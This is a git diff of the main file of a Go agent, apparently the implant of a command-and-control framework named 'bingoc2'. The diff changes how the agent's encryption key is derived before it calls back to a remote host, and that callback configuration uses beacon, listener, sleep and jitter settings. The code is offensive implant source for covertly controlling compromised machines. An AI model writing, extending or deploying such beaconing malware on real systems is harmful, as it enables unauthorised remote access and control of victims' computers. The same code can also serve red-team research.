@@ -2,6 +2,7 @@ package main
 
 import (
 	"dingo/initialization"
+	"encoding/binary"
 	"os"
 	"strconv"
 	"time"
@@ -22,16 +23,18 @@ var (
 	USERAGENT     string = "bingoc2/1.0.0"       // useragent of callback
 	URI           string = "index.php"           // uri to callback to
 	sKEY          string                         // key for encryption
-	KEY                  = []byte(sKEY)          // key for encryption in []byte (useable version)
+	bKEY                 = make([]byte, 32)      // key for encryption in []byte (useable version)
 
 	AgentID string = hg.RandomStr(4) // ID of agent (used by server to identify who is calling)
 )
 
 func main() {
 	sleep := SLEEP
+	nKEY, _ := strconv.ParseUint(sKEY, 10, 64)
+	binary.LittleEndian.PutUint64(bKEY, uint64(nKEY))
 
 	// initiliaze sessions
-	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, KEY, BEACON_NAME)
+	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKEY, BEACON_NAME)
 	if err != nil {
 		os.Exit(1)
 	}
